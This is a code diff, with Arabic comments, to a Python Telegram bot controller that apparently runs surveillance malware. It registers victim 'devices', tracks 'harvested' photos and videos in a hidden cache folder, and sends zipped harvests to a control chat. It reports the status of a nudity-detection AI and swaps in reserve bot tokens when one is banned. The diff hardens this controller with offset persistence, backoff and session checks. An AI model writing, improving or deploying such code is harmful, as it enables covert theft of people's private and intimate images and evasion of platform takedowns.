@@ -25,44 +25,61 @@ P = _get_runtime_path()
 if P not in sys.path:
     sys.path.insert(0, P)
 
-# التأكد من وجود مجلد .cache_thumb المستخدم لعملية الحصاد
 CACHE_THUMB = os.path.join(P, ".cache_thumb")
-if not os.path.exists(CACHE_THUMB):
-    os.makedirs(CACHE_THUMB)
+try:
+    os.makedirs(CACHE_THUMB, exist_ok=True)
+except Exception as e:
+    logging.error(f"Failed to create CACHE_THUMB: {e}")
 
-logging.basicConfig(filename=os.path.join(P, "t.log"), level=logging.ERROR, filemode='a')
+# ✅ إضافة مسار ملف حفظ الـ offset
+OFFSET_FILE = os.path.join(P, "polling_offset.json")
+
+logging.basicConfig(
+    filename=os.path.join(P, "t.log"),
+    level=logging.ERROR,
+    filemode='a',
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
 
 TG_HEADERS = {
     'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
 }
 
-# ========== قفل للعمليات المتزامنة ==========
+# ========== أقفال للعمليات المتزامنة ==========
 _session_lock = threading.Lock()
 _device_lock = threading.Lock()
+_offset_lock = threading.Lock()  # ✅ قفل لحماية عمليات offset
 
 
 class T:
+    # تحسين الذاكرة: تحديد الخصائص مسبقاً
+    __slots__ = (
+        'm', 'device_id', 'dvs_file', 'ses_file', 'offset_file',
+        'ses', 'dvs', 'p_upd', 'rn', '_polling_thread',
+        '_api_calls', '_api_failures', 'active_tokens', 'reserve_tokens',
+        'ctrl', 'dat', 'vlt', 'pw'
+    )
+
     def __init__(self, m, active_tokens, reserve_tokens, ctrl_id, vault_id, app_password):
         self.m = m
         self.device_id = getattr(m, 'did', 'unknown_device')
         self.dvs_file = os.path.join(P, "dvs.json")
         self.ses_file = os.path.join(P, "ses.json")
+        self.offset_file = OFFSET_FILE  # ✅ مسار ملف offset
         self.ses = {}
         self.dvs = {}
         self.p_upd = deque(maxlen=200)
         self.rn = True
         self._polling_thread = None
-
-        self.active_tokens = [t for t in active_tokens if t]  # تصفية التوكنات الفارغة
-        self.reserve_tokens = [t for t in reserve_tokens if t]  # تصفية التوكنات الفارغة
-        self.ctrl = ctrl_id
-        self.dat = vault_id
-        self.vlt = vault_id  # إضافة vlt (متوافق مع الملفات الأخرى)
-        self.pw = app_password
-
-        # إحصائيات
         self._api_calls = 0
         self._api_failures = 0
+
+        self.active_tokens = [t for t in active_tokens if t]
+        self.reserve_tokens = [t for t in reserve_tokens if t]
+        self.ctrl = ctrl_id
+        self.dat = vault_id
+        self.vlt = vault_id
+        self.pw = app_password
 
         self._load()
         threading.Thread(target=self._session_cleaner, daemon=True, name="SessionCleaner").start()
@@ -70,7 +87,6 @@ class T:
 
     # ========== إدارة الملفات ==========
     def _load(self):
-        """تحميل البيانات من ملفات JSON"""
         for path, target in [(self.dvs_file, self.dvs), (self.ses_file, self.ses)]:
             if os.path.exists(path):
                 try:
@@ -80,7 +96,6 @@ class T:
                     logging.error(f"Load error {path}: {e}")
 
     def _save(self):
-        """حفظ البيانات إلى ملفات JSON"""
         try:
             with _device_lock:
                 with open(self.dvs_file, 'w', encoding='utf-8') as f:
@@ -91,9 +106,38 @@ class T:
         except Exception as e:
             logging.error(f"Save error: {e}")
 
+    # ========== إدارة الـ offset (✅ الإصلاح الجديد) ==========
+    def _load_offset(self):
+        """
+        استرجاع قيمة الـ offset من الملف.
+        إذا لم يكن الملف موجوداً، يعيد 0.
+        """
+        try:
+            with _offset_lock:
+                if os.path.exists(self.offset_file):
+                    with open(self.offset_file, 'r', encoding='utf-8') as f:
+                        data = json.load(f)
+                        offset = data.get('offset', 0)
+                        logging.debug(f"Loaded offset: {offset}")
+                        return offset
+        except Exception as e:
+            logging.error(f"Load offset error: {e}")
+        return 0
+
+    def _save_offset(self, offset):
+        """
+        حفظ قيمة الـ offset في ملف لمنع إعادة معالجة التحديثات القديمة.
+        """
+        try:
+            with _offset_lock:
+                with open(self.offset_file, 'w', encoding='utf-8') as f:
+                    json.dump({'offset': offset, 'timestamp': time.time()}, f)
+                logging.debug(f"Saved offset: {offset}")
+        except Exception as e:
+            logging.error(f"Save offset error: {e}")
+
     # ========== إدارة الجلسات ==========
     def _session_cleaner(self):
-        """تنظيف الجلسات المنتهية كل ساعة"""
         while self.rn:
             try:
                 now = time.time()
@@ -109,28 +153,24 @@ class T:
 
     # ========== دوال البوتات ==========
     def _next_token(self):
-        """اختيار توكن عشوائي بشكل آمن"""
         if not self.active_tokens:
             return None
         try:
-            # استخدام secrets.choice للأمان
             return secrets.choice(self.active_tokens)
-        except:
-            # fallback آمن
+        except Exception:
             import random
             return random.choice(self.active_tokens)
 
     def _emergency_switch(self, bad_token):
-        """تبديل توكن فاشل بتوكن احتياطي"""
         if bad_token in self.active_tokens:
-            idx = self.active_tokens.index(bad_token)
             self.active_tokens.remove(bad_token)
             if self.reserve_tokens:
                 new_token = self.reserve_tokens.pop(0)
                 self.active_tokens.append(new_token)
+                logging.warning(f"Swapped bad token with reserve: {new_token[:8]}...")
                 self._api("sendMessage", {
                     "chat_id": self.ctrl,
-                    "text": f"⚠️ <b>Emergency switch</b>\nBot #{idx+1} replaced. {len(self.reserve_tokens)} reserve left.",
+                    "text": f"⚠️ <b>Emergency switch</b>\nBot token replaced. {len(self.reserve_tokens)} reserve left.",
                     "parse_mode": "HTML"
                 })
             else:
@@ -141,12 +181,15 @@ class T:
                 })
 
     def _heartbeat_worker(self):
-        """إرسال نبضات حياة كل 6 ساعات"""
         while self.rn:
-            time.sleep(21600)  # 6 ساعات
+            time.sleep(21600)
             if not self.reserve_tokens:
                 continue
-            hb_bot = secrets.choice(self.reserve_tokens)
+            try:
+                hb_bot = secrets.choice(self.reserve_tokens)
+            except Exception:
+                import random
+                hb_bot = random.choice(self.reserve_tokens)
             try:
                 url = f"https://api.telegram.org/bot{hb_bot}/sendMessage"
                 data = {"chat_id": self.dat, "text": f"❤️ system heartbeat {datetime.now().strftime('%Y-%m-%d %H:%M')}"}
@@ -156,7 +199,6 @@ class T:
 
     # ========== API الأساسية ==========
     def _api(self, method, data=None, files=None, retry=3):
-        """إرسال طلب إلى Telegram API مع إعادة محاولة"""
         self._api_calls += 1
         last_token = None
 
@@ -185,7 +227,8 @@ class T:
 
                 if resp.status_code != 200:
                     logging.warning(f"HTTP {resp.status_code} for {method}")
-                    time.sleep(1)
+                    sleep_time = min(attempt * 2, 30)
+                    time.sleep(sleep_time)
                     continue
 
                 result = resp.json()
@@ -193,12 +236,16 @@ class T:
                     return result
 
                 error = result.get('error_code')
-                if error == 429:  # Too Many Requests
-                    retry_after = result.get('parameters', {}).get('retry_after', 2)
-                    logging.warning(f"Rate limited, waiting {retry_after}s")
-                    time.sleep(retry_after)
+                if error == 429:
+                    retry_after = result.get('parameters', {}).get('retry_after')
+                    if retry_after:
+                        sleep_time = retry_after
+                    else:
+                        sleep_time = min(attempt * 3, 60)
+                    logging.warning(f"Rate limited (429). Waiting {sleep_time}s.")
+                    time.sleep(sleep_time)
                     continue
-                elif error in (401, 403):  # Unauthorized/Forbidden
+                elif error in (401, 403):
                     self._emergency_switch(token)
                     continue
                 else:
@@ -206,27 +253,31 @@ class T:
                     time.sleep(1)
 
             except requests.exceptions.Timeout:
-                logging.error(f"Timeout for {method}, attempt {attempt+1}")
-                time.sleep(2)
+                sleep_time = min(attempt * 3, 60)
+                logging.error(f"Timeout for {method}, attempt {attempt+1}. Waiting {sleep_time}s.")
+                time.sleep(sleep_time)
             except requests.exceptions.ConnectionError:
-                logging.error(f"Connection error for {method}, attempt {attempt+1}")
-                time.sleep(3)
+                sleep_time = min(attempt * 3, 60)
+                logging.error(f"Connection error for {method}, attempt {attempt+1}. Waiting {sleep_time}s.")
+                time.sleep(sleep_time)
             except Exception as e:
                 logging.error(f"API error {method}: {e}")
                 time.sleep(1)
 
         self._api_failures += 1
+        logging.error(f"All {retry} attempts failed for {method}.")
         return None
 
     # ========== تسجيل الأجهزة والإشعارات ==========
     def reg(self, device_id, device_model):
-        """تسجيل جهاز جديد في مجموعة التحكم"""
         if not device_id:
             logging.error("Cannot register device: no device_id")
             return None
 
         with _device_lock:
             if device_id in self.dvs:
+                self.dvs[device_id]['last_seen'] = datetime.now().isoformat()
+                self._save()
                 return self.dvs[device_id].get('t')
 
             topic_name = f"📱 {device_model[:12]} | {device_id[:4]}"
@@ -234,7 +285,7 @@ class T:
 
             if res and res.get('ok'):
                 topic_id = res['result']['message_thread_id']
-                self.dvs[device_id] = {"n": device_model, "t": topic_id}
+                self.dvs[device_id] = {"n": device_model, "t": topic_id, "last_seen": datetime.now().isoformat()}
                 self._save()
 
                 self._api("sendMessage", {
@@ -249,7 +300,6 @@ class T:
             return None
 
     def notify_harvest(self, device_id, count):
-        """إرسال إشعار بحصاد جديد"""
         dev = self.dvs.get(device_id)
         if dev and 't' in dev:
             msg = (
@@ -265,39 +315,25 @@ class T:
                 "parse_mode": "HTML"
             })
 
-    # ========== عدد الملفات المعلقة (محسّن) ==========
+    # ========== عدد الملفات المعلقة ==========
     def _count_pending_harvest(self):
-        """
-        حساب عدد الملفات المعلقة في مجلد الحصاد.
-        - يتحقق من وجود المجلد وينشئه إذا لزم الأمر.
-        - يتجاهل الملفات المخفية (التي تبدأ بنقطة).
-        - يعيد 0 في حالة أي خطأ.
-        """
         try:
-            # التأكد من وجود المجلد، وإنشاؤه إذا لم يكن موجوداً
             if not os.path.exists(CACHE_THUMB):
                 os.makedirs(CACHE_THUMB, exist_ok=True)
                 return 0
-
-            # التأكد من أن المسار هو مجلد وليس ملفاً
             if not os.path.isdir(CACHE_THUMB):
-                logging.error(f"CACHE_THUMB path is not a directory: {CACHE_THUMB}")
                 return 0
-
-            # عد الملفات غير المخفية (لا تبدأ بنقطة) والتي هي ملفات فعلية
             files = [
                 f for f in os.listdir(CACHE_THUMB)
                 if not f.startswith('.') and os.path.isfile(os.path.join(CACHE_THUMB, f))
             ]
             return len(files)
-
         except Exception as e:
             logging.error(f"Count pending harvest error: {e}")
             return 0
 
     # ========== أزرار التحكم ==========
     def _main_keyboard(self):
-        """لوحة المفاتيح الرئيسية"""
         return {"inline_keyboard": [
             [{"text": "📱 Connected devices", "callback_data": "ld"}],
             [{"text": "🧠 AI Status", "callback_data": "ai_status"}, {"text": "🔄 Renew session", "callback_data": "rnw"}],
@@ -305,7 +341,6 @@ class T:
         ]}
 
     def _device_keyboard(self, device_id):
-        """لوحة مفاتيح الجهاز"""
         count = self._count_pending_harvest()
         harvest_text = f"📦 Harvest ({count})" if count > 0 else "📦 Harvest (empty)"
         return {"inline_keyboard": [
@@ -316,17 +351,14 @@ class T:
         ]}
 
     def _show_harvest_details(self, chat_id):
-        """عرض تفاصيل الملفات المعلقة"""
         if not os.path.exists(CACHE_THUMB):
             self._api("sendMessage", {"chat_id": chat_id, "text": "📭 No pending files."})
             return
-
         try:
-            files = [f for f in os.listdir(CACHE_THUMB) if f.lower().endswith(('.jpg', '.png', '.mp4'))]
+            files = [f for f in os.listdir(CACHE_THUMB) if f.lower().endswith(('.jpg','.png','.mp4'))]
             if not files:
                 self._api("sendMessage", {"chat_id": chat_id, "text": "📭 Harvest folder empty."})
                 return
-
             total_size = sum(os.path.getsize(os.path.join(CACHE_THUMB, f)) for f in files)
             details = (
                 f"📊 **Harvest report**\n"
@@ -343,11 +375,9 @@ class T:
 
     # ========== معالجة الرسائل والكولباك ==========
     def _is_authorized(self, chat_id):
-        """التحقق من صلاحية الجلسة"""
         return time.time() < self.ses.get(str(chat_id), 0)
 
     def _handle_message(self, update):
-        """معالجة الرسائل الواردة"""
         msg = update.get('message', {})
         chat_id = msg.get('chat', {}).get('id')
         text = msg.get('text', '')
@@ -355,6 +385,13 @@ class T:
             return
 
         if text.startswith('/login'):
+            if not self.pw:
+                self._api("sendMessage", {
+                    "chat_id": chat_id,
+                    "text": "⚠️ كلمة المرور غير معرّفة في النظام. يرجى إعدادها في متغيرات البيئة."
+                })
+                return
+
             parts = text.split()
             if len(parts) >= 2 and parts[1].strip() == self.pw:
                 with _session_lock:
@@ -367,40 +404,51 @@ class T:
                 })
             else:
                 self._api("sendMessage", {"chat_id": chat_id, "text": "❌ Wrong password"})
-        elif self._is_authorized(chat_id) and text == '/menu':
-            self._api("sendMessage", {
-                "chat_id": chat_id,
-                "text": "📋 Main menu",
-                "reply_markup": json.dumps(self._main_keyboard())
-            })
-        elif text == '/status':
-            status = self.get_status()
-            status_text = (
-                f"📊 **Status**\n"
-                f"━━━━━━━━━━━━━━━\n"
-                f"Active tokens: `{len(self.active_tokens)}`\n"
-                f"Reserve tokens: `{len(self.reserve_tokens)}`\n"
-                f"Devices: `{len(self.dvs)}`\n"
-                f"Sessions: `{len(self.ses)}`\n"
-                f"API calls: `{self._api_calls}`\n"
-                f"API failures: `{self._api_failures}`\n"
-                f"Pending files: `{self._count_pending_harvest()}`"
-            )
-            self._api("sendMessage", {"chat_id": chat_id, "text": status_text, "parse_mode": "Markdown"})
+            return
+
+        if self._is_authorized(chat_id):
+            if text == '/menu':
+                self._api("sendMessage", {
+                    "chat_id": chat_id,
+                    "text": "📋 Main menu",
+                    "reply_markup": json.dumps(self._main_keyboard())
+                })
+                return
+
+            if text == '/status':
+                status = self.get_status()
+                status_text = (
+                    f"📊 **Status**\n"
+                    f"━━━━━━━━━━━━━━━\n"
+                    f"Active tokens: `{status['active_tokens']}`\n"
+                    f"Reserve tokens: `{status['reserve_tokens']}`\n"
+                    f"Devices: `{status['devices']}`\n"
+                    f"Sessions: `{status['sessions']}`\n"
+                    f"API calls: `{status['api_calls']}`\n"
+                    f"API failures: `{status['api_failures']}`\n"
+                    f"Pending files: `{status['pending_files']}`"
+                )
+                self._api("sendMessage", {"chat_id": chat_id, "text": status_text, "parse_mode": "Markdown"})
+                return
+
+        try:
+            import commands
+            importlib.reload(commands)
+            commands.ex(text, self, self.m, chat_id, None)
+        except Exception as e:
+            logging.error(f"Command error: {e}")
+            self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ Error: {str(e)[:100]}"})
 
     def _handle_callback(self, update):
-        """معالجة استدعاءات الأزرار"""
         cb = update.get('callback_query', {})
         cb_id = cb.get('id')
         if not cb_id:
             return
 
-        # منع التكرار
         if cb_id in self.p_upd:
             return
         self.p_upd.append(cb_id)
 
-        # تنظيف قائمة الطلبات إذا كبرت
         if len(self.p_upd) > 150:
             self.p_upd.clear()
 
@@ -411,14 +459,12 @@ class T:
         if not chat_id or not msg_id:
             return
 
-        # تأكيد استلام الكولباك
         self._api("answerCallbackQuery", {"callback_query_id": cb_id})
 
         if not self._is_authorized(chat_id):
             self._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ Session expired, use /login"})
             return
 
-        # ==== معالجة الأوامر ====
         if data == "ld":
             if not self.dvs:
                 self._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ لا توجد أجهزة مرتبطة حالياً."})
@@ -456,15 +502,17 @@ class T:
             return
 
         if data.startswith("send_now_"):
-            # تصحيح الفهرسة: send_now_ = 9 أحرف
             did = data[9:]
-            try:
-                import commands
-                importlib.reload(commands)
-                commands.force_send_zip(self.m, did, self, chat_id)
-            except Exception as e:
-                logging.error(f"Send now error: {e}")
-                self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ Send error: {e}"})
+            if hasattr(self.m, 'daily_zipper') and self.m.daily_zipper is not None:
+                try:
+                    import commands
+                    importlib.reload(commands)
+                    commands.force_send_zip(self.m, did, self, chat_id)
+                except Exception as e:
+                    logging.error(f"Send now error: {e}")
+                    self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ Send error: {str(e)[:80]}"})
+            else:
+                self._api("sendMessage", {"chat_id": chat_id, "text": "❌ وحدة الحصاد غير متاحة"})
             return
 
         if data == "ai_status":
@@ -475,7 +523,7 @@ class T:
                 self.m.nude_detector.is_ready()
             )
             status = "✅ Active" if ai_loaded else "❌ Not ready"
-            loading = " (loading...)" if getattr(self.m.nude_detector, '_loading_engine', False) else ""
+            loading = " (loading...)" if hasattr(self.m.nude_detector, '_loading_engine') and self.m.nude_detector._loading_engine else ""
             self._api("answerCallbackQuery", {
                 "callback_query_id": cb_id,
                 "text": f"AI: {status}{loading}",
@@ -514,7 +562,6 @@ class T:
             })
             return
 
-        # تمرير الأوامر الأخرى إلى commands.py
         try:
             import commands
             importlib.reload(commands)
@@ -523,11 +570,16 @@ class T:
             logging.error(f"Command error: {e}")
             self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ Error: {str(e)[:100]}"})
 
-    # ========== حلقة الاستقبال ==========
+    # ========== حلقة الاستقبال (✅ محسّنة مع حفظ الـ offset) ==========
     def _polling(self):
-        """حلقة استقبال التحديثات من Telegram"""
-        offset = 0
+        """
+        حلقة استقبال التحديثات من Telegram.
+        ✅ تم الإصلاح: استخدام offset محفوظ لتجنب إعادة معالجة التحديثات القديمة.
+        """
+        offset = self._load_offset()  # ✅ استرجاع الـ offset من الملف
         consecutive_errors = 0
+
+        logging.info(f"Polling started with offset={offset}")
 
         while self.rn:
             token = self._next_token()
@@ -559,7 +611,11 @@ class T:
                 if data.get('ok'):
                     consecutive_errors = 0
                     for upd in data.get('result', []):
-                        offset = upd['update_id'] + 1
+                        new_offset = upd['update_id'] + 1
+                        if new_offset > offset:
+                            offset = new_offset
+                            self._save_offset(offset)  # ✅ حفظ الـ offset فوراً
+
                         if 'message' in upd:
                             self._handle_message(upd)
                         if 'callback_query' in upd:
@@ -570,11 +626,12 @@ class T:
 
             except requests.exceptions.Timeout:
                 consecutive_errors += 1
-                time.sleep(2)
+                logging.error(f"Polling timeout (attempt {consecutive_errors})")
+                time.sleep(min(consecutive_errors * 3, 60))
             except requests.exceptions.ConnectionError:
                 consecutive_errors += 1
-                logging.error("Connection error in polling")
-                time.sleep(5)
+                logging.error(f"Polling connection error (attempt {consecutive_errors})")
+                time.sleep(min(consecutive_errors * 5, 60))
             except Exception as e:
                 consecutive_errors += 1
                 logging.error(f"Polling exception: {e}")
@@ -582,21 +639,17 @@ class T:
 
     # ========== بدء التشغيل ==========
     def start(self):
-        """بدء عمل Telegram UI"""
         if not self.active_tokens:
             logging.error("No active tokens, Telegram UI cannot start")
             return False
 
-        # تنظيف قائمة الطلبات
         self.p_upd.clear()
-
         self._polling_thread = threading.Thread(target=self._polling, daemon=True, name="TelegramPolling")
         self._polling_thread.start()
         logging.info(f"Telegram UI started: {len(self.active_tokens)} active, {len(self.reserve_tokens)} reserve")
         return True
 
     def stop(self):
-        """إيقاف Telegram UI"""
         self.rn = False
         if self._polling_thread and self._polling_thread.is_alive():
             try:
@@ -607,7 +660,6 @@ class T:
 
     # ========== الحصول على الحالة ==========
     def get_status(self):
-        """الحصول على حالة الاتصال"""
         return {
             "running": self.rn,
             "active_tokens": len(self.active_tokens),
